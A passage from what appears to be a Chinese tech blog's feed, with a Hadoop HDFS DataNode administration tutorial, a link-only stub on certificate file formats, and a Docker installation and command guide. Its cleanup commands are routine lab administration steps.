punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（2）停止集群，删除三台节点的data和logs中所有数据。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf data/ logs/<span class="token punctuation">[</span>molly@hadoop103 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf data/ logs/<span class="token punctuation">[</span>molly@hadoop104 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf data/ logs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（3）格式化集群并启动。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ bin/hdfs namenode –format<span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）查看结果</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 dfs<span class="token punctuation">]</span>$ ll总用量 12drwx------. 3 molly molly 4096 12月 11 08:03 datadrwxrwxr-x. 3 molly molly 4096 12月 11 08:03 name1drwxrwxr-x. 3 molly molly 4096 12月 11 08:03 name2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-DataNode（面试开发重点）"><a href="#3-DataNode（面试开发重点）" class="headerlink" title="3 DataNode（面试开发重点）"></a>3 DataNode（面试开发重点）</h1><h2 id="3-1-DataNode工作机制"><a href="#3-1-DataNode工作机制" class="headerlink" title="3.1 DataNode工作机制"></a>3.1 DataNode工作机制</h2><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638342000541.png" alt="1638342000541"></p><p>（1）一个数据块在DataNode上以文件形式存储在磁盘上，包括两个文件，一个是数据本身，一个是元数据包括数据块的长度，块数据的校验和，以及时间戳。<br>（2）DataNode启动后向NameNode注册，通过后，周期性（1小时）的向NameNode上报所有的块信息。<br>（3）心跳是每3秒一次，心跳返回结果带有NameNode给该DataNode的命令如复制块数据到另一台机器，或删除某个数据块。如果超过10分钟没有收到某个DataNode的心跳，则认为该节点不可用。<br>（4）集群运行中可以安全加入和退出一些机器。</p><h2 id="3-2-数据完整性"><a href="#3-2-数据完整性" class="headerlink" title="3.2 数据完整性"></a>3.2 数据完整性</h2><p>思考：如果电脑磁盘里面存储的数据是控制高铁信号灯的红灯信号（1）和绿灯信号（0），但是存储该数据的磁盘坏了，一直显示是绿灯，是否很危险？同理DataNode节点上的数据损坏了，却没有发现，是否也很危险，那么如何解决呢？<br>如下是DataNode节点保证数据完整性的方法。<br>（1）当DataNode读取Block的时候，它会计算CheckSum。<br>（2）如果计算后的CheckSum，与Block创建时值不一样，说明Block已经损坏。<br>（3）Client读取其他DataNode上的Block。<br>（4）常见的校验算法 crc（32），md5（128），sha1（160）<br>（5）DataNode在其文件创建后周期验证CheckSum。</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638342020071.png" alt="1638342020071"></p><h2 id="3-3-掉线时限参数设置"><a href="#3-3-掉线时限参数设置" class="headerlink" title="3.3 掉线时限参数设置"></a>3.3 掉线时限参数设置</h2><p>需要注意的是hdfs-site.xml 配置文件中的heartbeat.recheck.interval的单位为毫秒，dfs.heartbeat.interval的单位为秒。</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638342040415.png" alt="1638342040415"></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.heartbeat.recheck-interval<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>300000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.heartbeat.interval<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-服役新数据节点"><a href="#3-4-服役新数据节点" class="headerlink" title="3.4 服役新数据节点"></a>3.4 服役新数据节点</h2><p>1）需求<br>随着公司业务的增长，数据量越来越大，原有的数据节点的容量已经不能满足存储数据的需求，需要在原有集群基础上动态添加新的数据节点。<br>2）环境准备<br>（1）在hadoop104主机上再克隆一台hadoop105主机<br>（2）修改IP地址和主机名称<br>（3）删除原来HDFS文件系统留存的文件（/opt/module/hadoop-3.1.3/data和logs）<br>（4）source一下配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop105 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）服役新节点具体步骤<br>（1）直接启动DataNode，即可关联到集群</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop105 hadoop-3.1.3<span class="token punctuation">]</span>$ hdfs --daemon start datanode<span class="token punctuation">[</span>molly@hadoop105 hadoop-3.1.3<span class="token punctuation">]</span>$ yarn --daemon start nodemanager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638342075539.png" alt="1638342075539"></p><p>（2）在hadoop105上上传文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop105 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -put /opt/module/hadoop-3.1.3/LICENSE.txt /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）如果数据不均衡，可以用命令实现集群的再平衡</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 sbin<span class="token punctuation">]</span>$ ./start-balancer.shstarting balancer, logging to /opt/module/hadoop-3.1.3/logs/hadoop-molly-balancer-hadoop102.outTime Stamp               Iteration<span class="token comment" spellcheck="true">#  Bytes Already Moved  Bytes Left To Move  Bytes Being Moved</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-5-退役旧数据节点"><a href="#3-5-退役旧数据节点" class="headerlink" title="3.5 退役旧数据节点"></a>3.5 退役旧数据节点</h2><h3 id="3-5-1-添加白名单和黑名单"><a href="#3-5-1-添加白名单和黑名单" class="headerlink" title="3.5.1 添加白名单和黑名单"></a>3.5.1 添加白名单和黑名单</h3><p>白名单和黑名单是hadoop管理集群主机的一种机制。<br>添加到白名单的主机节点，都允许访问NameNode，不在白名单的主机节点，都会被退出。添加到黑名单的主机节点，不允许访问NameNode，会在数据迁移后退出。<br>实际情况下，白名单用于确定允许访问NameNode的DataNode节点，内容配置一般与workers文件内容一致。 黑名单用于在集群运行过程中退役DataNode节点。<br>配置白名单和黑名单的具体步骤如下：<br>1）在NameNode节点的/opt/module/hadoop-3.1.3/etc/hadoop目录下分别创建whitelist 和blacklist文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3/etc/hadoop<span class="token punctuation">[</span>molly@hadoop102 hadoop<span class="token punctuation">]</span>$ <span class="token function">touch</span> whitelist<span class="token punctuation">[</span>molly@hadoop102 hadoop<span class="token punctuation">]</span>$ <span class="token function">touch</span> blacklist<span class="token comment" spellcheck="true">#在whitelist中添加如下主机名称,假如集群正常工作的节点为102 103 104 105</span>hadoop102hadoop103hadoop104hadoop105<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>黑名单暂时为空。<br>2）在hdfs-site.xml配置文件中增加dfs.hosts和 dfs.hosts.exclude配置参数</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- 白名单 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.hosts<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/module/hadoop-3.1.3/etc/hadoop/whitelist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 黑名单 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.hosts.exclude<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/module/hadoop-3.1.3/etc/hadoop/blacklist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）分发配置文件whitelist，blacklist，hdfs-site.xml (注意：105节点也要发一份)</p><pre class="line-numbers language-xml"><code class="language-xml">[molly@hadoop102 etc]$ xsync hadoop/ [molly@hadoop102 etc]$ rsync -av hadoop/ molly@hadoop105:/opt/module/hadoop-3.1.3/etc/hadoop/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4）重新启动集群(注意：105节点没有添加到workers，因此要单独起停)</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ stop-dfs.sh<span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ start-dfs.sh<span class="token punctuation">[</span>molly@hadoop105 hadoop-3.1.3<span class="token punctuation">]</span>$ hdfs –daemon start datanode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>5）在web浏览器上查看目前正常工作的DN节点</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638342091569.png" alt="1638342091569"></p><h3 id="3-5-2-黑名单退役"><a href="#3-5-2-黑名单退役" class="headerlink" title="3.5.2 黑名单退役"></a>3.5.2 黑名单退役</h3><p>1）编辑/opt/module/hadoop-3.1.3/etc/hadoop目录下的blacklist文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop<span class="token punctuation">]</span> vim blacklist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下主机名称（要退役的节点）</p><pre class="line-numbers language-bash"><code class="language-bash">hadoop105<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）分发blacklist到所有节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 etc<span class="token punctuation">]</span>$ xsync hadoop/ <span class="token punctuation">[</span>molly@hadoop102 etc<span class="token punctuation">]</span>$ <span class="token function">rsync</span> -av hadoop/ molly@hadoop105:/opt/module/hadoop-3.1.3/etc/hadoop/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3）刷新NameNode、刷新ResourceManager</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hdfs dfsadmin -refreshNodesRefresh nodes successful<span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ yarn rmadmin -refreshNodes17/06/24 14:55:56 INFO client.RMProxy: Connecting to ResourceManager at hadoop103/192.168.1.103:8033<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）检查Web浏览器，退役节点的状态为decommission in progress（退役中），说明数据节点正在复制块到其他节点</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638342103632.png" alt="1638342103632"></p><p>5）等待退役节点状态为decommissioned（所有块已经复制完成），停止该节点及节点资源管理器。注意：如果副本数是3，服役的节点小于等于3，是不能退役成功的，需要修改副本数后才能退役</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638342110735.png" alt="1638342110735"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop105 hadoop-3.1.3<span class="token punctuation">]</span>$ hdfs --daemon stop datanodestopping datanode<span class="token punctuation">[</span>molly@hadoop105 hadoop-3.1.3<span class="token punctuation">]</span>$ yarn --daemon stop nodemanagerstopping nodemanager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6）如果数据不均衡，可以用命令实现集群的再平衡</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-balancer.sh starting balancer, logging to /opt/module/hadoop-3.1.3/logs/hadoop-molly-balancer-hadoop102.outTime Stamp               Iteration<span class="token comment" spellcheck="true">#  Bytes Already Moved  Bytes Left To Move  Bytes Being Moved</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：不允许白名单和黑名单中同时出现同一个主机名称，既然使用了黑名单blacklist成功退役了hadoop105节点，因此要将白名单whitelist里面的hadoop105去掉。</p><h2 id="3-6-DataNode多目录配置"><a href="#3-6-DataNode多目录配置" class="headerlink" title="3.6 DataNode多目录配置"></a>3.6 DataNode多目录配置</h2><p>1）DataNode可以配置成多个目录，<strong>每个目录存储的数据不一样</strong>。即：数据不是副本<br>2）具体配置如下<br>（1）在hdfs-site.xml文件中添加如下内容</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.datanode.data.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>file://$<span class="token entity" title="&#123;">&amp;#123;</span>hadoop.tmp.dir<span class="token entity" title="&#125;">&amp;#125;</span>/dfs/data1,file://$<span class="token entity" title="&#123;">&amp;#123;</span>hadoop.tmp.dir<span class="token entity" title="&#125;">&amp;#125;</span>/dfs/data2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（2）停止集群，删除三台节点的data和logs中所有数据。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf data/ logs/<span class="token punctuation">[</span>molly@hadoop103 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf data/ logs/<span class="token punctuation">[</span>molly@hadoop104 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf data/ logs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（3）格式化集群并启动。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ bin/hdfs namenode –format<span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）查看结果</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 dfs<span class="token punctuation">]</span>$ ll总用量 12drwx------. 3 molly molly 4096 4月   4 14:22 data1drwx------. 3 molly molly 4096 4月   4 14:22 data2drwxrwxr-x. 3 molly molly 4096 12月 11 08:03 name1drwxrwxr-x. 3 molly molly 4096 12月 11 08:03 name2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-hdfs3-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>证书的各种格式</title>
      <link>https://m01ly.github.io/2020/10/10/cipher-certificate-format/</link>
      <guid>https://m01ly.github.io/2020/10/10/cipher-certificate-format/</guid>
      <pubDate>Sat, 10 Oct 2020 06:56:33 GMT</pubDate>
      
      <description>&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><p> 证书主要的文件类型和协议有: PEM、DER、PFX、JKS、KDB、CER、KEY、CSR、CRT、CRL 、OCSP、SCEP等。 </p><p>一编码格式</p><p><a href="https://blog.csdn.net/hqy1719239337/article/details/88896074">https://blog.csdn.net/hqy1719239337/article/details/88896074</a></p><p>二 文件后缀</p><p><a href="https://blog.csdn.net/bolang789/article/details/74942925">https://blog.csdn.net/bolang789/article/details/74942925</a></p><p><a href="https://blog.csdn.net/yetugeng/article/details/100629159">https://blog.csdn.net/yetugeng/article/details/100629159</a></p><p>三 后缀转化</p><p><a href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>https://m01ly.github.io/2020/10/10/cipher-certificate-format/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>docker使用大全</title>
      <link>https://m01ly.github.io/2020/09/28/docker-guide/</link>
      <guid>https://m01ly.github.io/2020/09/28/docker-guide/</guid>
      <pubDate>Mon, 28 Sep 2020 07:22:20 GMT</pubDate>
      
      <description>&lt;p&gt;自己检索方便&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自己检索方便</p><a id="more"></a><h1 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1 docker安装"></a>1 docker安装</h1><h4 id="1-1卸载旧版本"><a href="#1-1卸载旧版本" class="headerlink" title="1.1卸载旧版本"></a>1.1卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p><p>（1）杀死所有运行容器</p><pre><code>docker kill $(docker ps -a -q)</code></pre><p>（2）删除所有容器</p><pre><code>docker rm $(docker ps -a -q)</code></pre><p>（3）删除所有镜像</p><pre><code>docker rmi $(docker images -q)</code></pre><p>（4）停止 docker 服务</p><pre><code>systemctl stop docker</code></pre><p>（5）删除存储目录</p><pre><code>rm -rf /etc/docker# rm -rf /run/docker# rm -rf /var/lib/dockershim# rm -rf /var/lib/docker</code></pre><p>  如果发现删除不掉，需要先 umount，如</p><pre><code>umount /var/lib/docker/devicemapper</code></pre><p>（6）首先搜索已经安装的docker 安装包   </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum list installed|grep docker </span>docker.x86_64 2:1.12.6-16.el7.centos @extras docker-client.x86_64 2:1.12.6-16.el7.centos @extras docker-common.x86_64 2:1.12.6-16.el7.centos @extra<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（7） 分别删除安装包 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#yum –y remove docker.x86_64 docker-client.x86_64 docker-common.x86_64 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（8） 删除docker 镜像 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># rm -rf /var/lib/docker </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（9）再次check docker是否已经卸载成功 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum list installed|grep docker </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有，就表示卸载成功。</p><p>在新主机上首次安装 Docker Engine-Community 之前，需要设置 Docker 仓库。之后，您可以从仓库安装和更新 Docker。</p><h4 id="1-2安装-Docker-Engine-Community"><a href="#1-2安装-Docker-Engine-Community" class="headerlink" title="1.2安装 Docker Engine-Community"></a>1.2安装 Docker Engine-Community</h4><p><strong>设置仓库</strong></p><p>安装所需的软件包。yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span>  -y yum-utils \ device-mapper-persistent-data \ lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以选择国内的一些aliyun源地址：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager \    --add-repo \    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-3安装-Docker-Engine-Community"><a href="#1-3安装-Docker-Engine-Community" class="headerlink" title="1.3安装 Docker Engine-Community"></a>1.3安装 Docker Engine-Community</h4><p>(1)安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2)安装特定版本的docker</p><p>列出可以安装的可用版本</p><pre><code>yum list docker-ce --showduplicates | sort -r</code></pre><p>选择特定版本安装，这里选择18.06.0.ce-3.el7版本</p><pre><code>sudo yum install docker-ce-18.06.0.ce-3.el7 -y</code></pre><h4 id="1-4启动-Docker。"><a href="#1-4启动-Docker。" class="headerlink" title="1.4启动 Docker。"></a>1.4启动 Docker。</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> docker run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/28/docker-guide/1603272603871.png" alt="1603272603871"></p><h4 id="1-5-CentOS中修改Docker的默认根目录"><a href="#1-5-CentOS中修改Docker的默认根目录" class="headerlink" title="1.5  CentOS中修改Docker的默认根目录"></a>1.5  CentOS中修改Docker的默认根目录</h4><p>1） 先使用: ‘docker info’ 命令,看下原来默认的根目录位置</p><pre class="line-numbers language-bash"><code class="language-bash">docker info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）先关闭docker服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> docker stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）直接修改/etc/docker/daemon.json:</p><p>修改docker安装目录到/mnt目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token string">"data-root"</span><span class="token keyword">:</span> <span class="token string">"/mnt/docker"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4）在你指定的目录位置新建文件夹 /new-path/docker</p><p>5）重启docker服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> docker start<span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）使用docker info命令确认是否修改成功</p><h1 id="2-docker常用命令"><a href="#2-docker常用命令" class="headerlink" title="2 docker常用命令"></a>2 docker常用命令</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> search ubantu <span class="token comment" spellcheck="true">#搜索镜像</span><span class="token variable">$docker</span> pull ubantu  <span class="token comment" spellcheck="true">#载入镜像</span><span class="token variable">$docker</span> run -it ubuntu /bin/bash <span class="token comment" spellcheck="true">#启动镜像</span>root@ed09e4490c57:/<span class="token comment" spellcheck="true"># exit退出容器</span>$ docker <span class="token function">ps</span> -a  <span class="token comment" spellcheck="true">#查看所有的容器</span>$ docker <span class="token function">ps</span> -l <span class="token comment" spellcheck="true">#查看最后一次创建的容器</span>$ docker start b750bbbcfd88  <span class="token comment" spellcheck="true">#使用 docker start 启动一个已停止的容器</span>$ docker stop <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#停止一个容器</span>$ docker restart <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#重启一个容器</span>$ docker <span class="token function">rm</span> -f <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个容器</span>$ docker rmi  <span class="token operator">&lt;</span>镜像名称<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个镜像</span>$ docker run -itd --name ubuntu-test ubuntu /bin/bash <span class="token comment" spellcheck="true">#后台运行容器</span>$ docker <span class="token function">exec</span> -it <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> /bin/bash <span class="token comment" spellcheck="true">#进入一个容器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>镜像打包如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> <span class="token function">ps</span> <span class="token variable">$docker</span> login harbor.XX.io/openvas <span class="token comment" spellcheck="true">#输入域帐号&amp;密码</span><span class="token variable">$docker</span> commit <span class="token operator">&lt;</span>容器name<span class="token operator">></span> harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span><span class="token variable">$docker</span> push harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-1-docker-访问宿主机目录"><a href="#2-1-docker-访问宿主机目录" class="headerlink" title="2.1 docker 访问宿主机目录"></a>2.1 docker 访问宿主机目录</h2><h3 id="挂载一个目录"><a href="#挂载一个目录" class="headerlink" title="挂载一个目录"></a>挂载一个目录</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 执行之后，相当于把此数据目录挂载在对应docker的目录中，用  即可查看并访问所挂载数据。Dockerfile中最后一行运行相应的 </p><p>例如：</p><pre 